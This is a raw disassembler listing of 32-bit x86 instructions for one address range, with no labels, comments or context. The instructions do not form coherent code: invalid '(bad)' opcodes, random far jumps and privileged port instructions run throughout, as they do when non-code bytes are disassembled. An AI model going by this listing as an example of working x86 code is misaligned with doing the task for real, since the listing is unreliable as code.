  420c5d:	jmp    0x41a9:0x4ebe37f7
  420c64:	(bad)  
  420c65:	call   0x19ddc13a
  420c6a:	xlat   BYTE PTR ds:[ebx]
  420c6b:	leave  
  420c6c:	mov    cl,BYTE PTR ds:0x42dc2a45
  420c72:	jecxz  0x420c37
  420c74:	xor    BYTE PTR [edx+0x48],bh
  420c77:	das    
  420c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c79:	jl     0x420c93
  420c7b:	xchg   ebx,eax
  420c7c:	sbb    BYTE PTR [edi+0x5],ah
  420c7f:	mov    edx,0x82fd135d
  420c84:	lods   eax,DWORD PTR ds:[esi]
  420c85:	dec    esp
  420c86:	pop    edx
  420c87:	out    dx,eax
  420c88:	clc    
  420c89:	jmp    0x59ba2184
  420c8e:	mov    bl,0x1a
  420c90:	mov    ebp,0x8a8be452
  420c95:	cmc    
  420c96:	mov    ecx,0x23bf616e
  420c9b:	mov    bh,0xc9
  420c9d:	xchg   ecx,eax
  420c9e:	and    dh,al
  420ca0:	mov    al,0xe6
  420ca2:	popf   
  420ca3:	pusha  
  420ca4:	cld    
  420ca5:	sub    al,0xad
  420ca7:	fsub   DWORD PTR ds:0x608c1a8c
  420cad:	rol    DWORD PTR [eax+ebx*8+0x479502ab],cl
  420cb4:	dec    ecx
  420cb5:	ret    0x1eff
  420cb8:	js     0x420c5e
  420cba:	fidiv  WORD PTR [edi+0x5e]
  420cbd:	push   eax
  420cbe:	call   0x109c:0xfa176bd8
  420cc5:	jmp    0xa00f6e80
  420cca:	inc    eax
  420ccb:	pop    ds
  420ccc:	mov    edi,0x3e5fc07a
  420cd1:	push   es
  420cd2:	mov    ecx,DWORD PTR [esi+0x244a5a81]
  420cd8:	and    ah,BYTE PTR [ecx]
  420cda:	sub    BYTE PTR [ecx+0x71b84bc8],al
  420ce0:	inc    esp
  420ce1:	mul    DWORD PTR [esi]
  420ce3:	scas   eax,DWORD PTR es:[edi]
  420ce4:	(bad)  
  420ce6:	mov    ds:0xb1396338,eax
  420ceb:	aaa    
  420cec:	mov    al,ds:0x46504b85
  420cf1:	inc    esi
  420cf2:	or     eax,0xf0c0855d
  420cf7:	(bad)  
  420cf8:	cmp    BYTE PTR [edx],al
  420cfa:	adc    DWORD PTR [esi+0x6a236648],eax
  420d00:	(bad)  
  420d01:	pop    ss
  420d02:	scas   al,BYTE PTR es:[edi]
  420d03:	sbb    ecx,ebx
  420d05:	xor    al,0xd9
  420d07:	jb     0x420d54
  420d09:	and    DWORD PTR [edx+0x8],esp
  420d0c:	sub    DWORD PTR [ecx],edx
  420d0e:	xor    al,0x7
  420d10:	cmc    
  420d11:	xlat   BYTE PTR ds:[ebx]
  420d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d13:	sar    BYTE PTR [ebx],1
  420d15:	rol    DWORD PTR [ebp+0x4e23a84a],0x14
  420d1c:	rcr    DWORD PTR [eax],cl
  420d1e:	push   ss
  420d1f:	lds    esp,FWORD PTR [ebp+0x7caa7861]
  420d25:	sahf   
  420d26:	adc    esp,DWORD PTR [ebx-0xa]
  420d29:	mov    ch,0xb1
  420d2b:	loope  0x420d7f
  420d2d:	fidivr DWORD PTR [ecx+ebx*4]
  420d30:	lds    ebp,FWORD PTR [edx+0x11]
  420d33:	mov    ebp,0xbfb9a883
  420d38:	jne    0x420d4f
  420d3a:	push   ss
  420d3b:	push   esi
  420d3c:	and    DWORD PTR [ebx],esp
  420d3e:	and    DWORD PTR [ebx-0x7fe323a0],eax
  420d44:	mov    eax,0x68228987
  420d49:	ds aas 
  420d4b:	loop   0x420d6d
  420d4d:	cmp    eax,0x3237bd92
  420d52:	xchg   ebp,eax
  420d53:	leave  
  420d54:	out    dx,al
  420d55:	inc    edi
  420d56:	fidivr WORD PTR [edx+0x3ab5e822]
  420d5c:	dec    esi
  420d5d:	out    0xc6,eax
  420d5f:	mov    bh,0xb2
  420d61:	mov    ecx,0x4edd35ab
  420d66:	retf   
  420d67:	retf   0xefca
  420d6a:	push   esp
  420d6b:	call   0xaa43fe6d
  420d70:	ror    BYTE PTR [eax-0x6a4a1ccc],1
  420d76:	cmp    edi,ecx
  420d78:	dec    ecx
  420d79:	xor    dl,BYTE PTR [edx+0x33]
  420d7c:	jb     0x420df5
  420d7e:	push   cs
  420d7f:	adc    ebp,DWORD PTR [esi]
  420d81:	neg    BYTE PTR [ecx-0x5c]
  420d84:	lods   eax,DWORD PTR ds:[esi]
  420d85:	add    esi,ecx
  420d87:	cli    
  420d88:	sub    DWORD PTR [ecx],edx
  420d8a:	retf   
  420d8b:	pop    esp
  420d8c:	push   ecx
  420d8d:	das    
  420d8e:	cs in  al,0x23
  420d91:	pusha  
  420d92:	call   0x8fd9:0x84d2391f
  420d99:	icebp  
  420d9a:	xchg   edx,eax
  420d9b:	clc    
  420d9c:	jle    0x420dd7
  420d9e:	mov    esi,0x5ffbe88b
  420da3:	outs   dx,BYTE PTR ds:[esi]
  420da4:	lods   eax,DWORD PTR ds:[esi]
  420da5:	jmp    0x2feea16a
  420daa:	pop    esp
  420dab:	scas   al,BYTE PTR es:[edi]
  420dac:	adc    DWORD PTR [eax+0x397168cf],edi
  420db2:	repz inc ecx
  420db4:	adc    dh,BYTE PTR gs:[ebx+0x1e]
  420db8:	popa   
  420db9:	and    ecx,esi
  420dbb:	inc    edi
  420dbc:	sti    
  420dbd:	pop    ebx
  420dbe:	mov    esp,0xf969e218
  420dc3:	enter  0xe3b5,0x33
  420dc7:	cmp    bh,BYTE PTR gs:[ebx]
  420dca:	push   edx
  420dcb:	pop    es
  420dcc:	pop    ss
  420dcd:	and    eax,0xb03f0911
  420dd2:	cmp    al,0x91
  420dd4:	add    eax,0x8cf6617d
  420dd9:	add    BYTE PTR [ecx+0x25],0xe9
  420ddd:	push   ds
  420dde:	pop    esi
  420ddf:	mov    esi,0xe616d844
  420de4:	jno    0x420daf
  420de6:	pop    es
  420de7:	mul    BYTE PTR [ecx+0x7daeca5e]
  420ded:	mov    edi,eax
  420def:	xor    al,ch
  420df1:	cmp    DWORD PTR [ecx+ebx*1],edi
  420df4:	(bad)  
  420df5:	mov    ebp,0x21c00e1f
  420dfa:	fdiv   QWORD PTR [ebx+0x77b707aa]
  420e00:	sub    ebx,edi
  420e02:	mov    BYTE PTR [ecx+edi*4+0x18a8b8a5],al
  420e09:	rcl    DWORD PTR [ebp-0x77],1
  420e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e0d:	es ret 0xcfdf
  420e11:	xchg   ebx,eax
  420e12:	ins    DWORD PTR es:[edi],dx
  420e13:	cs out 0xf9,al
  420e16:	sub    al,0xfa
  420e18:	add    DWORD PTR [edi+0x73732339],edx
  420e1e:	dec    ebp
  420e1f:	fmul   DWORD PTR [edi+0x6a6cee10]
  420e25:	xchg   edi,ebp
  420e27:	nop
  420e28:	ret    0x81f6
  420e2b:	xchg   ecx,eax
  420e2c:	and    al,0x18
  420e2e:	sbb    BYTE PTR [edx-0x7f],dh
  420e31:	mov    WORD PTR [ebp+eax*4+0x1c],?
  420e35:	mov    cl,0x33
  420e37:	bound  edx,QWORD PTR ds:0x78a688e5
  420e3d:	aam    0x55
  420e3f:	dec    ebx
  420e40:	sbb    esi,ebp
  420e42:	jg     0x420e42
  420e44:	xor    bh,BYTE PTR [ebx+0x72]
  420e47:	pushf  
  420e48:	mov    ds:0xf74b34d7,eax
  420e4d:	xchg   ebx,eax
  420e4e:	fisubr DWORD PTR [esi-0x609c593e]
  420e54:	push   ecx
  420e55:	fdiv   DWORD PTR [eax+0x32]
  420e58:	loopne 0x420e53
  420e5a:	cmp    ah,BYTE PTR [edi]
  420e5c:	xor    edi,DWORD PTR [esi]
  420e5e:	repz jg 0x420e29
  420e61:	or     al,0xd0
  420e63:	push   cs
  420e64:	xchg   ebx,eax
  420e65:	lock xchg edx,eax
  420e67:	inc    eax
  420e68:	sbb    BYTE PTR ds:0x18e2c917,dh
  420e6e:	and    al,0x91
  420e70:	das    
  420e71:	xchg   esp,eax
  420e72:	ds ja  0x420ee1
  420e75:	repnz mov bh,0x7c
  420e78:	and    eax,0x5d3e5734
  420e7d:	repnz cwde 
  420e7f:	cld    
  420e80:	jne    0x420ec7
  420e82:	shl    DWORD PTR [eax+ecx*2-0x67],0x50
  420e87:	sub    dh,BYTE PTR [esp+esi*2-0x7b]
  420e8b:	mov    ecx,0x7684e769
  420e90:	fld    QWORD PTR [eax]
  420e92:	dec    ebp
  420e93:	imul   DWORD PTR [ebx+0x3a]
  420e96:	test   BYTE PTR [edx-0x568b3891],cl
  420e9c:	xor    DWORD PTR [ebx],ebx
  420e9e:	jmp    0x83b0:0xd30cacfb
  420ea5:	jp     0x420f1c
  420ea7:	mov    ebx,0x40deeeb0
  420eac:	(bad)  
  420ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eae:	mov    BYTE PTR [esi+0x4b],cl
  420eb1:	jno    0x420eda
  420eb3:	xor    DWORD PTR [edi+0x504fecf8],0x1f
  420eba:	jl     0x420e9b
  420ebc:	pop    ebx
  420ebd:	mov    bl,0xe1
  420ebf:	jbe    0x420e8b
  420ec1:	jg     0x420f24
  420ec3:	add    BYTE PTR cs:[ecx+edx*4],bl
  420ec7:	aad    0x8d
  420ec9:	cli    
  420eca:	or     al,0xed
  420ecc:	mov    bh,0x4e
  420ece:	jbe    0x420ebf
  420ed0:	lods   al,BYTE PTR ds:[esi]
  420ed1:	mov    eax,ds:0x3b386f47
  420ed6:	lock fs iret 
  420ed9:	pop    ebx
  420eda:	fisub  DWORD PTR [ebx+eiz*2-0x56]
  420ede:	xchg   DWORD PTR cs:[ebx+0x2bac596],ebx
  420ee5:	xor    edx,DWORD PTR [ebx+edi*8-0xff6b9be]
  420eec:	mov    BYTE PTR [eax+eiz*8-0x1c],dl
  420ef0:	inc    edi
  420ef1:	jg     0x420f6e
  420ef3:	and    al,0xd9
  420ef5:	das    
  420ef6:	arpl   WORD PTR [edi-0x66bacdb1],cx
  420efc:	mov    BYTE PTR [ebx],0x6a
  420eff:	sbb    eax,DWORD PTR [ebx+edi*8]
  420f02:	jp     0x420f68
  420f04:	push   ebx
  420f05:	ret    0xe4b8
  420f08:	pop    ecx
  420f09:	jl     0x420f13
  420f0b:	xor    ecx,DWORD PTR [edi+edx*4]
  420f0e:	(bad)  
  420f0f:	stos   DWORD PTR es:[edi],eax
  420f10:	fwait
  420f11:	ret    0xc388
  420f14:	sar    DWORD PTR [edi+0x7cdac4a8],0x6b
  420f1b:	sar    DWORD PTR [ebx],cl
  420f1d:	xchg   edx,eax
  420f1e:	dec    esi
  420f1f:	pop    ecx
  420f20:	sub    ecx,0x3022453
  420f26:	mov    ch,0x7d
  420f28:	loop   0x420eec
  420f2a:	sar    BYTE PTR [esi-0x8],cl
  420f2d:	xchg   esi,eax
  420f2e:	sar    DWORD PTR [esi+edx*4],cl
  420f31:	push   ebx
  420f32:	fldcw  WORD PTR [ecx-0x670daa1c]
  420f38:	loop   0x420f6b
  420f3a:	(bad)  
  420f3b:	xchg   ebx,eax
  420f3c:	mov    edx,0xa32223cd
  420f41:	and    eax,DWORD PTR [esi-0x47a90b7d]
  420f47:	jae    0x420fc1
  420f49:	mov    dh,0x7b
  420f4b:	xchg   ecx,eax
  420f4c:	xchg   esi,eax
  420f4d:	dec    ebp
  420f4e:	or     BYTE PTR [edx],bh
  420f50:	loop   0x420f7c
  420f52:	mov    ds:0x1c6a3b73,al
  420f57:	add    bl,BYTE PTR [eax-0x13]
  420f5a:	or     al,0x2c
  420f5c:	mov    dl,0xc8
  420f5e:	inc    eax
  420f5f:	or     eax,0x77df25c2
  420f64:	retf   0x7676
  420f67:	cdq    
  420f68:	pop    esp
  420f69:	push   esi
  420f6a:	dec    ebx
  420f6b:	js     0x420fcf
  420f6d:	mov    dh,0xc6
  420f6f:	mov    edi,esp
  420f71:	add    al,0x81
  420f73:	imul   esp,DWORD PTR [ebx-0x549ccbf1],0x5d
  420f7a:	rcr    DWORD PTR [eax-0x3f],0xb1
  420f7e:	mov    ch,0x5f
  420f80:	in     al,dx
  420f81:	cmp    BYTE PTR [edx],ah
  420f83:	mov    bh,bh
  420f85:	sbb    BYTE PTR [esi],dh
  420f87:	dec    esp
  420f88:	sar    BYTE PTR [ecx],1
  420f8a:	mov    ebx,0x1fa30e92
  420f8f:	out    dx,al
  420f90:	test   al,0xf9
  420f92:	rcr    DWORD PTR [eax],1
  420f94:	and    DWORD PTR [edi+ebp*8],edi
  420f97:	loopne 0x420f23
  420f99:	mov    edi,0xd845bb3c
  420f9e:	(bad)  
  420f9f:	fsubp  st(7),st
  420fa1:	push   ebp
  420fa2:	sbb    ch,BYTE PTR [esi]
  420fa4:	outs   dx,DWORD PTR ds:[esi]
  420fa5:	scas   eax,DWORD PTR es:[edi]
  420fa6:	dec    edi
  420fa7:	rcl    DWORD PTR [ebp+0x2be41620],cl
  420fad:	(bad)  [edx+0x49]
  420fb0:	mov    ecx,0xdc64c135
  420fb5:	inc    edx
  420fb6:	clc    
  420fb7:	ror    ecx,0x8d
  420fba:	dec    ebx
  420fbb:	xor    DWORD PTR [edi],esp
  420fbd:	push   cs
  420fbe:	fisttp WORD PTR [ebx-0x53]
  420fc1:	or     DWORD PTR [edi-0xe],esi
  420fc4:	jmp    0xf1fd:0x684d89f1
  420fcb:	mov    eax,ds:0xefde610c
  420fd0:	and    eax,0x258b848e
  420fd5:	sbb    eax,0xbb5fc051
  420fda:	inc    ecx
  420fdb:	and    BYTE PTR [edx-0x452778de],ch
  420fe1:	cli    
  420fe2:	jmp    0x42100a
  420fe4:	shl    BYTE PTR [esi],1
  420fe6:	sub    dl,BYTE PTR [edi+0x49]
  420fe9:	(bad)  
  420fea:	and    ah,BYTE PTR [esi+0x1c]
  420fed:	stc    
  420fee:	(bad)  
  420ff0:	ss jns 0x42101a
  420ff3:	mov    bl,ch
  420ff5:	push   ebx
  420ff6:	cld    
  420ff7:	push   0xffffffff
  420ff9:	mov    esi,0xd3c53ccb
  420ffe:	fadd   QWORD PTR [eax-0x43]
  421001:	push   edi
  421002:	push   ss
  421003:	cmc    
  421004:	cmp    al,0xeb
  421006:	xchg   esi,eax
  421007:	inc    edx
  421008:	call   0xf96f4c0f
  42100d:	clc    
  42100e:	and    ebx,DWORD PTR [eax-0x1c]
  421011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421012:	aad    0x22
  421014:	sbb    al,0xe6
  421016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421017:	scas   al,BYTE PTR es:[edi]
  421018:	push   ss
  421019:	sahf   
  42101a:	push   edx
  42101b:	into   
  42101c:	outs   dx,BYTE PTR ds:[esi]
  42101d:	repz pusha 
  42101f:	mov    ds,WORD PTR [eax+0x1]
  421022:	test   BYTE PTR [esi],dh
  421024:	(bad)  
  421025:	fs jecxz 0x421014
  421028:	out    0x1f,eax
  42102a:	push   ss
  42102b:	xchg   esp,eax
  42102c:	je     0x42104c
  42102e:	and    ebp,DWORD PTR ds:0x3f7fb834
  421034:	les    ecx,FWORD PTR [ebp+0x6e]
  421037:	cmp    al,0x4b
  421039:	mov    ch,0xbb
  42103b:	adc    dl,ch
  42103d:	(bad)  
  42103e:	xor    BYTE PTR ds:0xdd3fabdd,ah
  421044:	sbb    BYTE PTR [ebx+0x66],al
  421047:	pusha  
  421048:	mov    ebp,0x4201662c
  42104d:	push   edi
  42104e:	mov    edx,0x774e8905
  421053:	icebp  
  421054:	add    ah,BYTE PTR [ecx]
  421056:	mov    eax,0x2eedbb87
  42105b:	pop    edi
  42105c:	js     0x42107a
  42105e:	sub    DWORD PTR [edi+eiz*8-0x54],esp
  421062:	(bad)  
  421063:	fisubr DWORD PTR [esp+eiz*4]
  421066:	sti    
  421067:	(bad)  
  421068:	(bad)  
  421069:	loope  0x42103e
  42106b:	out    0x2e,eax
  42106d:	rcr    ch,0xe1
  421070:	xchg   edi,eax
  421071:	jbe    0x4210b5
  421073:	jge    0x42109a
  421075:	dec    esp
  421076:	ror    DWORD PTR [eax],0xca
  421079:	imul   esi,esi,0xc1a7a26f
  42107f:	mov    ds:0xf9a8ca15,eax
  421084:	je     0x421066
  421086:	sub    dl,dh
  421088:	jae    0x4210ac
  42108a:	inc    edx
  42108b:	pop    ds
  42108c:	je     0x421068
  42108e:	(bad)  
  42108f:	fild   QWORD PTR [esi+0x3e12544f]
  421095:	push   esi
  421096:	mov    DWORD PTR [esi-0x1dbdbe03],ecx
  42109c:	in     eax,dx
  42109d:	and    DWORD PTR [edx+0x3f],ecx
  4210a0:	cli    
  4210a1:	mov    esi,0x4875a835
  4210a6:	mov    dh,0xdc
  4210a8:	mul    DWORD PTR [ecx+0x1a]
  4210ab:	xor    al,BYTE PTR [edx+0x2e5685ee]
  4210b1:	pop    eax
  4210b2:	test   BYTE PTR [ebx-0x1c],0x35
  4210b6:	jb     0x4210ef
  4210b8:	enter  0x5a4e,0x11
  4210bc:	jbe    0x421062
  4210be:	push   es
  4210bf:	vmread DWORD PTR [ecx+0x6f620157],esi
  4210c6:	jmp    0xdefd:0xad035521
  4210cd:	enter  0x420f,0xb3
  4210d1:	mov    ecx,0x94d41763
  4210d6:	mov    eax,0xdec6577e
  4210db:	dec    eax
  4210dc:	mov    dl,0x5e
  4210de:	jl     0x4210a6
  4210e0:	cmc    
  4210e1:	out    0xd2,eax
  4210e3:	jo     0x421066
  4210e5:	sahf   
  4210e6:	jge    0x421108
  4210e8:	call   0xa121d960
  4210ed:	(bad)  
  4210ee:	cmp    esp,ebx
  4210f0:	icebp  
  4210f1:	push   ebp
  4210f2:	ins    DWORD PTR es:[edi],dx
  4210f3:	and    BYTE PTR [ebx+0x61c7f72],al
  4210f9:	xchg   ebp,eax
  4210fa:	fild   QWORD PTR [edi-0x75]
  4210fd:	fstp   DWORD PTR [ecx+0x31]
  421100:	sbb    BYTE PTR [eax+0x7d],0x48
  421104:	ss fcmovu st,st(4)
  421107:	sbb    al,BYTE PTR [ecx]
  421109:	in     al,0x7
  42110b:	pop    esi
  42110c:	inc    esp
  42110d:	jge    0x4210c4
  42110f:	fcom   DWORD PTR [eax+0x2b]
  421112:	inc    ebp
  421113:	jge    0x421179
  421115:	scas   al,BYTE PTR es:[edi]
  421116:	cmp    DWORD PTR [edx+0x72f261f7],eax
  42111c:	jo     0x4210c0
  42111e:	jp     0x42111e
  421120:	daa    
  421121:	inc    edi
  421122:	stos   DWORD PTR es:[edi],eax
  421123:	and    ebp,DWORD PTR [edi-0x1476413d]
  421129:	test   al,0x97
  42112b:	cmp    ebx,ecx
  42112d:	jns    0x4210d9
  42112f:	aaa    
  421130:	jg     0x421148
  421132:	cmp    eax,0xd5d3f62b
  421137:	adc    eax,0xfe73e3e9
  42113c:	movhps xmm5,QWORD PTR [eax+0x6b]
  421140:	add    ecx,DWORD PTR [edx+0x30]
  421143:	jmp    0x3860:0x40827a2b
  42114a:	mov    dl,0xf4
  42114c:	xchg   edx,eax
  42114d:	xor    al,BYTE PTR [ebp+ebx*8-0x36]
  421151:	xor    al,0x11
  421153:	outs   dx,DWORD PTR ds:[esi]
  421154:	pop    esp
  421155:	adc    eax,0x3a3d324c
  42115a:	lods   eax,DWORD PTR ds:[esi]
  42115b:	cdq    
  42115c:	imul   esi,DWORD PTR [edi-0x7d8a6215],0xdbd31de8
  421166:	neg    ch
  421168:	js     0x421153
  42116a:	mov    dl,0x62
  42116c:	sub    bl,dh
  42116e:	xchg   edi,eax
  42116f:	call   0x7abf9fcc
  421174:	mov    esi,0x36baf872
  421179:	nop
  42117a:	push   edi
  42117b:	and    dl,BYTE PTR [esi+0x1e783453]
  421181:	mov    esp,edi
  421183:	mov    esi,DWORD PTR [ecx+0x43cecf0a]
  421189:	push   ebx
  42118a:	pop    ecx
  42118b:	mov    ?,WORD PTR [ebp-0x47935416]
  421191:	mov    al,ds:0xc7ad2fa
  421196:	(bad)  [eax-0x61]
  421199:	mov    cl,0x2a
  42119b:	xor    BYTE PTR ds:0x3c12ad8b,dh
  4211a1:	xlat   BYTE PTR ds:[ebx]
  4211a2:	sub    cl,bh
  4211a4:	in     eax,dx
  4211a5:	pusha  
  4211a6:	adc    BYTE PTR [esi],cl
  4211a8:	fcomp  DWORD PTR [ecx+ecx*8]
  4211ab:	and    eax,0x68dcf299
  4211b0:	or     cl,ah
  4211b2:	xchg   ebx,eax
  4211b3:	leave  
  4211b4:	jmp    0xb2d9:0x5ece5631
  4211bb:	mov    dl,0x1
  4211bd:	push   ss
  4211be:	idiv   ah
  4211c0:	loop   0x421173
  4211c2:	lods   eax,DWORD PTR ds:[esi]
  4211c3:	mov    edx,0x6b53d9d7
  4211c8:	xchg   ecx,eax
  4211c9:	test   al,0x8c
  4211cb:	loopne 0x421233
  4211cd:	and    DWORD PTR [esi+0x2b32806f],edi
  4211d3:	fnstenv [eax+0x53]
  4211d6:	mov    BYTE PTR [ebx+0x61],al
  4211d9:	jns    0x421254
  4211db:	test   BYTE PTR [ebx-0x2390224f],ah
  4211e1:	test   DWORD PTR [ebp+0x6b321916],edx
  4211e7:	scas   eax,DWORD PTR es:[edi]
  4211e8:	or     BYTE PTR gs:[esi],al
  4211eb:	repnz add DWORD PTR [esi+0x30b39a67],edi
  4211f2:	jmp    0x421253
  4211f4:	jecxz  0x421187
  4211f6:	and    esp,DWORD PTR [edx]
  4211f8:	add    al,0x44
  4211fa:	pop    es
  4211fb:	push   ebp
  4211fc:	in     al,0x6e
  4211fe:	add    al,0xa1
  421200:	mov    edi,0x16d7afee
  421205:	icebp  
  421206:	mov    al,ds:0xeef8d2b5
  42120b:	dec    edi
  42120c:	hlt    
  42120d:	push   0x3b
  42120f:	fdivrp st(0),st
  421211:	jns    0x4211e3
  421213:	ret    0x7556
  421216:	pop    esp
  421217:	arpl   WORD PTR [ebp+eiz*4-0x29],sp
  42121b:	ret    0x68e0
  42121e:	push   0x7c8bb985
  421223:	je     0x42123c
  421225:	in     eax,dx
  421226:	enter  0xd401,0x60
  42122a:	inc    edi
  42122b:	dec    edx
  42122c:	jmp    0xe41269f4
  421231:	push   esp
  421232:	adc    eax,0x437894a2
  421237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421238:	adc    eax,esi
  42123a:	push   ebp
  42123b:	jmp    0x84f0:0x68309e7a
  421242:	xchg   BYTE PTR [edi],dh
  421244:	fwait
  421245:	push   edx
  421246:	outs   dx,BYTE PTR ds:[esi]
  421247:	aaa    
  421248:	push   esi
  421249:	add    dl,bh
  42124b:	addr16 dec ebx
  42124d:	sub    cl,0x99
  421250:	jp     0x4212cb
  421252:	(bad)  
  421253:	enter  0xa9bf,0x3d
  421257:	sub    BYTE PTR [edx],dh
  421259:	sub    eax,0xb145390
  42125e:	cmp    bh,ch
  421260:	aaa    
  421261:	pop    ecx
  421262:	cmp    eax,0x6d68da76
  421267:	addr16 stc 
  421269:	xchg   ebp,eax
  42126a:	push   es
  42126b:	push   0x4ad0da5d
  421270:	push   ebx
  421271:	mov    ds:0x3998536f,eax
  421276:	sbb    ah,BYTE PTR [ebp+0x1e]
  421279:	push   ebx
  42127a:	outs   dx,BYTE PTR ds:[esi]
  42127b:	push   esi
  42127c:	aaa    
  42127d:	push   edi
  42127e:	and    al,0x8f
  421280:	mov    dh,BYTE PTR [edi+eiz*4]
  421283:	stos   BYTE PTR es:[edi],al
  421284:	mov    eax,ds:0xfbda4ca0
  421289:	stc    
  42128a:	pop    ss
  42128b:	pop    edx
  42128c:	fimul  DWORD PTR [edx-0x1944257b]
  421292:	out    dx,al
  421293:	aas    
  421294:	mov    al,ah
  421296:	adc    ebx,ecx
  421298:	in     al,0x6
  42129a:	pop    esp
  42129b:	push   esi
  42129c:	xor    eax,0xbc09ca2
  4212a1:	mov    WORD PTR [esi+0x6272a64a],fs
  4212a7:	jmp    0xe210ad16
  4212ac:	lds    esi,FWORD PTR [ebx+0x45bf3d6]
  4212b2:	pop    eax
  4212b3:	mov    ds:0xdec53081,eax
  4212b8:	push   ds
  4212b9:	mov    ebp,esp
  4212bb:	cmp    BYTE PTR [edx],bh
  4212bd:	loope  0x421325
  4212bf:	in     eax,dx
  4212c0:	xchg   esp,eax
  4212c1:	iret   
  4212c2:	adc    dl,BYTE PTR [esi-0x1db824ef]
  4212c8:	(bad)  
  4212c9:	lods   al,BYTE PTR ds:[esi]
  4212ca:	test   BYTE PTR [esi],dl
  4212cc:	fiadd  WORD PTR [ebx]
  4212ce:	fs sbb al,0xd3
  4212d1:	add    ebx,DWORD PTR [esi-0xb79c20b]
  4212d7:	jne    0x4212e1
  4212d9:	ss inc ebx
  4212db:	cmp    edi,0xffffffa7
  4212de:	mov    al,0x10
  4212e0:	idiv   DWORD PTR [edx]
  4212e2:	dec    ebx
  4212e3:	shr    DWORD PTR [ecx-0x67],cl
  4212e6:	fidivr WORD PTR [esi+0xdba1964]
  4212ec:	(bad)  
  4212ed:	ror    BYTE PTR [edx+0x5c9db59b],1
  4212f3:	mov    eax,0xa93f16d7
  4212f8:	add    ecx,DWORD PTR [esi+0x50dd9e28]
  4212fe:	jmp    0xf027:0x9e129496
  421305:	mov    eax,0xf63ac790
  42130a:	and    BYTE PTR [edx],0x87
  42130d:	inc    esi
  42130e:	and    eax,0x6dffa848
  421313:	sbb    cl,BYTE PTR [edx-0x2c085be7]
  421319:	scas   eax,DWORD PTR es:[edi]
  42131a:	test   DWORD PTR [esi],0x63b2346c
  421320:	add    dh,BYTE PTR [edx-0x166a37e6]
  421326:	hlt    
  421327:	inc    esp
  421328:	pop    ecx
  421329:	dec    ecx
  42132a:	ja     0x4213a9
  42132c:	jns    0x4212c4
  42132e:	rol    cl,0x70
  421331:	and    eax,0x492c2266
  421336:	jo     0x4212fb
  421338:	jb     0x421378
  42133a:	jp     0x421358
  42133c:	js     0x4212e0
  42133e:	mov    esp,0x162438e0
  421343:	hlt    
  421344:	cwde   
  421345:	inc    esp
  421346:	dec    ebx
  421347:	jnp    0x4212ff
  421349:	mov    dh,0x31
  42134b:	aam    0x78
  42134d:	leave  
  42134e:	les    esp,FWORD PTR [ecx-0x44]
  421351:	inc    ebp
  421352:	sub    BYTE PTR [edx+0xd],0x9c
  421356:	in     eax,0x54
  421358:	or     DWORD PTR [esi],esi
  42135a:	cmp    al,0xdd
  42135c:	mov    esp,edi
  42135e:	loopne 0x421398
  421360:	or     BYTE PTR [esi+0x64],dl
  421363:	sbb    al,0xe1
  421365:	cmc    
  421366:	scas   eax,DWORD PTR es:[edi]
  421367:	cwde   
  421368:	push   cs
  421369:	dec    esp
  42136a:	and    eax,ecx
  42136c:	lds    ebp,FWORD PTR [ebx+0x4648a1]
  421372:	cmc    
  421373:	retf   
  421374:	mov    al,0xd6
  421376:	loop   0x4213d3
  421378:	aaa    
  421379:	repz sbb eax,0x21932c38
  42137f:	push   esi
  421380:	fsubr  QWORD PTR [edx-0x1a]
  421383:	dec    edx
  421384:	push   0xffffffff
  421386:	xchg   ebx,eax
  421387:	out    dx,al
  421388:	or     eax,0x8bde964
  42138d:	fld    TBYTE PTR [ecx+0xd183ec0]
  421393:	mov    edx,0x9b5077f8
  421398:	ss dec ebx
  42139a:	inc    ecx
  42139b:	inc    ebp
  42139c:	sub    esp,DWORD PTR [esi+0x4b]
  42139f:	mov    eax,0xc782fb32
  4213a4:	mov    al,ds:0x4e15ebc2
  4213a9:	jmp    0x41968883
  4213ae:	inc    esp
  4213af:	(bad)  
  4213b0:	mov    ebp,0x29f77758
  4213b5:	(bad)  
  4213b6:	aad    0xed
  4213b8:	imul   ebx,DWORD PTR [ebx+0x59],0xffffffd9
  4213bc:	(bad)  
  4213bd:	jns    0x4213a1
  4213bf:	push   esi
  4213c0:	leave  
  4213c1:	jmp    0x642f3a7
  4213c6:	xor    edi,ecx
  4213c8:	mov    dh,0xcc
  4213ca:	mov    BYTE PTR [eax-0x11d20924],dl
  4213d0:	and    al,0x24
  4213d2:	inc    eax
  4213d3:	mov    al,ds:0x3385c79
  4213d8:	enter  0xe62e,0x9
  4213dc:	(bad)  
  4213dd:	cmp    bh,BYTE PTR [ebx-0x6898b0e5]
  4213e3:	mov    dh,0x20
  4213e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213e6:	mov    WORD PTR [edi],ds
  4213e8:	cmp    eax,0x491c3d3c
  4213ed:	xor    al,0x25
  4213ef:	push   cs
  4213f0:	dec    ebp
  4213f1:	push   0x1c
  4213f3:	xor    DWORD PTR [ebx],0xffffffb8
  4213f6:	mov    DWORD PTR [eax-0x78ee0ac8],ebx
  4213fc:	pushf  
  4213fd:	pushf  
  4213fe:	sub    eax,0xfd359b39
  421403:	add    DWORD PTR [ebp-0x70eab1cc],edi
  421409:	cmp    BYTE PTR [eax],bh
  42140b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42140c:	sub    cl,ch
  42140e:	mov    edi,0x82425c5b
  421413:	arpl   WORD PTR [edi-0x26],dx
  421416:	or     DWORD PTR [edx+0x5cde704a],eax
  42141c:	scas   eax,DWORD PTR es:[edi]
  42141d:	push   esp
  42141e:	or     ch,ch
  421420:	gs (bad) 
  421422:	fwait
  421423:	jne    0x4214a1
  421425:	jp     0x4213cb
  421427:	imul   esp,DWORD PTR [ebp-0x1b3f403f],0x5f
  42142e:	add    BYTE PTR [ebx],0x8b
  421431:	(bad)  
  421432:	push   cs
  421433:	call   0x674a7c83
  421438:	add    BYTE PTR [edx+0x50],ah
  42143b:	add    ebx,esp
  42143d:	mov    ds:0x6f1bf74e,al
  421442:	icebp  
  421443:	xor    ebp,DWORD PTR [eax-0x4e7e8905]
  421449:	inc    ebx
  42144a:	jae    0x4214c8
